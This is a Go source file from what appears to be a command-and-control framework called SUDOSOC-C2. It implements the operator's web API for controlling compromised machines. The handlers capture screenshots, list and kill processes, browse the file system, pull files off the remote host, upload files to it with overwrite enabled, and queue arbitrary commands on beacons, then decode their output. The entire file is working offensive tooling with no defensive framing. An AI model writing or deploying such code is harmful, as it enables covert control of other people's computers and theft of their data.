package web

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif
	Session-level control APIs: screenshot, process list, file browser, download
*/

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
	"github.com/sudosoc/SUDOSOC-C2/server/db"
)

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/sessions/{id}/screenshot
// ─────────────────────────────────────────────────────────────────────────────

type screenshotResp struct {
	Data   string `json:"data"`   // base64-encoded PNG
	Width  int    `json:"width"`
	Height int    `json:"height"`
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	req := &sudosocpb.ScreenshotReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Screenshot{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("screenshot failed: %v", err), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(screenshotResp{
		Data: base64.StdEncoding.EncodeToString(resp.GetData()),
	})
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/sessions/{id}/ps
// ─────────────────────────────────────────────────────────────────────────────

type processJSON struct {
	PID          int32    `json:"pid"`
	PPID         int32    `json:"ppid"`
	Executable   string   `json:"executable"`
	Owner        string   `json:"owner"`
	Architecture string   `json:"arch"`
	CmdLine      []string `json:"cmdline"`
}

func handlePS(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	req := &sudosocpb.PsReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Ps{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("ps failed: %v", err), http.StatusInternalServerError)
		return
	}

	procs := make([]processJSON, 0, len(resp.GetProcesses()))
	for _, p := range resp.GetProcesses() {
		procs = append(procs, processJSON{
			PID:          p.GetPid(),
			PPID:         p.GetPpid(),
			Executable:   p.GetExecutable(),
			Owner:        p.GetOwner(),
			Architecture: p.GetArchitecture(),
			CmdLine:      p.GetCmdLine(),
		})
	}
	_ = json.NewEncoder(w).Encode(procs)
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/sessions/{id}/ls?path=/
// ─────────────────────────────────────────────────────────────────────────────

type fileInfoJSON struct {
	Name    string `json:"name"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime int64  `json:"mod_time"`
	Mode    string `json:"mode"`
}

type lsResp struct {
	Path  string         `json:"path"`
	Files []fileInfoJSON `json:"files"`
}

func handleLS(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	path := r.URL.Query().Get("path")
	if path == "" {
		path = "."
	}

	req := &sudosocpb.LsReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Ls{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("ls failed: %v", err), http.StatusInternalServerError)
		return
	}

	files := make([]fileInfoJSON, 0, len(resp.GetFiles()))
	for _, f := range resp.GetFiles() {
		files = append(files, fileInfoJSON{
			Name:    f.GetName(),
			IsDir:   f.GetIsDir(),
			Size:    f.GetSize(),
			ModTime: f.GetModTime(),
			Mode:    f.GetMode(),
		})
	}
	_ = json.NewEncoder(w).Encode(lsResp{Path: resp.GetPath(), Files: files})
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/sessions/{id}/download?path=/path/to/file
// Returns the file as a binary download
// ─────────────────────────────────────────────────────────────────────────────

func handleDownload(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	path := r.URL.Query().Get("path")
	if path == "" {
		jsonError(w, "path is required", http.StatusBadRequest)
		return
	}

	req := &sudosocpb.DownloadReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Download{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("download failed: %v", err), http.StatusInternalServerError)
		return
	}

	// Detect file name from path
	fname := path
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			fname = path[i+1:]
			break
		}
	}
	if fname == "" {
		fname = "download"
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fname))
	w.Header().Set("Content-Length", strconv.Itoa(len(resp.GetData())))
	_, _ = w.Write(resp.GetData())
}

// ─────────────────────────────────────────────────────────────────────────────
// DELETE /api/sessions/{id}/ps/{pid}  — Kill a remote process
// ─────────────────────────────────────────────────────────────────────────────

func handleTerminateProcess(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	vars := mux.Vars(r)
	pid, err := strconv.Atoi(vars["pid"])
	if err != nil {
		jsonError(w, "invalid pid", http.StatusBadRequest)
		return
	}

	req := &sudosocpb.TerminateReq{
		Pid:     int32(pid),
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Terminate{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("terminate failed: %v", err), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/beacons/{id}/tasks  — List beacon tasks
// ─────────────────────────────────────────────────────────────────────────────

type beaconTaskJSON struct {
	ID          string `json:"id"`
	State       string `json:"state"`
	Description string `json:"description"`
	CreatedAt   int64  `json:"created_at"`
	SentAt      int64  `json:"sent_at"`
	CompletedAt int64  `json:"completed_at"`
}

func handleBeaconTasks(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	tasks, err := beaconTaskList(beaconID)
	if err != nil {
		jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(tasks)
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/beacons/{id}/execute  — Queue an execute task for a beacon
// ─────────────────────────────────────────────────────────────────────────────

func handleBeaconExecute(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	var req sessionExecuteReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	// For beacons we use async execution (queued task)
	execResp, err := queueBeaconExecute(beaconID, req.Command)
	if err != nil {
		jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(execResp)
}

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/sessions/{id}/upload  — Upload a file to a session
// Multipart form: file=<binary>, path=<remote destination path>
// ─────────────────────────────────────────────────────────────────────────────

type uploadResp struct {
	Path         string `json:"path"`
	WrittenFiles int32  `json:"written_files"`
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}

	// Parse multipart (max 512 MB)
	if err := r.ParseMultipartForm(512 << 20); err != nil {
		jsonError(w, "invalid multipart form: "+err.Error(), http.StatusBadRequest)
		return
	}

	remotePath := r.FormValue("path")
	if remotePath == "" {
		jsonError(w, "path is required", http.StatusBadRequest)
		return
	}

	file, hdr, err := r.FormFile("file")
	if err != nil {
		jsonError(w, "file is required: "+err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		jsonError(w, "failed to read file: "+err.Error(), http.StatusInternalServerError)
		return
	}

	req := &sudosocpb.UploadReq{
		Path:      remotePath,
		Data:      data,
		FileName:  hdr.Filename,
		Overwrite: true,
		Request:   &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Upload{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("upload failed: %v", err), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(uploadResp{
		Path:         resp.GetPath(),
		WrittenFiles: resp.GetWrittenFiles(),
	})
}

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/beacons/{id}/tasks/{taskID}  — Get full task content including output
// ─────────────────────────────────────────────────────────────────────────────

type beaconTaskContentResp struct {
	ID          string `json:"id"`
	State       string `json:"state"`
	Description string `json:"description"`
	CreatedAt   int64  `json:"created_at"`
	SentAt      int64  `json:"sent_at"`
	CompletedAt int64  `json:"completed_at"`
	Output      string `json:"output,omitempty"` // decoded stdout/stderr if available
	HasResponse bool   `json:"has_response"`
}

func handleBeaconTaskContent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["taskID"]

	task, err := db.BeaconTaskByID(taskID)
	if err != nil || task == nil {
		jsonError(w, "task not found", http.StatusNotFound)
		return
	}

	resp := beaconTaskContentResp{
		ID:          task.ID,
		State:       task.State,
		Description: task.Description,
		CreatedAt:   task.CreatedAt,
		SentAt:      task.SentAt,
		CompletedAt: task.CompletedAt,
		HasResponse: len(task.Response) > 0,
	}

	// Try to decode the response as a sudosocpb.Execute message
	if len(task.Response) > 0 {
		resp.Output = decodeBeaconTaskOutput(task.Response)
	}

	_ = json.NewEncoder(w).Encode(resp)
}

// decodeBeaconTaskOutput tries to extract human-readable output from a
// serialized beacon task response envelope. For Execute tasks it returns
// stdout + stderr; for other task types it returns a hex summary.
func decodeBeaconTaskOutput(rawResponse []byte) string {
	if len(rawResponse) == 0 {
		return ""
	}

	// Try to unmarshal as a sudosocpb.Envelope first
	var envelope sudosocpb.Envelope
	if err := proto.Unmarshal(rawResponse, &envelope); err == nil {
		// Try to decode the inner Data as an Execute response
		var execResp sudosocpb.Execute
		if err2 := proto.Unmarshal(envelope.GetData(), &execResp); err2 == nil {
			out := ""
			if len(execResp.GetStdout()) > 0 {
				out += string(execResp.GetStdout())
			}
			if len(execResp.GetStderr()) > 0 {
				if out != "" {
					out += "\n--- stderr ---\n"
				}
				out += string(execResp.GetStderr())
			}
			if out != "" {
				return out
			}
		}
	}

	// Fallback: base64 of raw bytes
	if len(rawResponse) > 256 {
		return fmt.Sprintf("[binary response: %d bytes]", len(rawResponse))
	}
	return base64.StdEncoding.EncodeToString(rawResponse)
}

// ─────────────────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────────────────

// getSession extracts + validates the session from URL vars.
func getSession(w http.ResponseWriter, r *http.Request) *core.Session {
	id := mux.Vars(r)["id"]
	session := core.Sessions.Get(id)
	if session == nil {
		jsonError(w, "session not found", http.StatusNotFound)
		return nil
	}
	return session
}
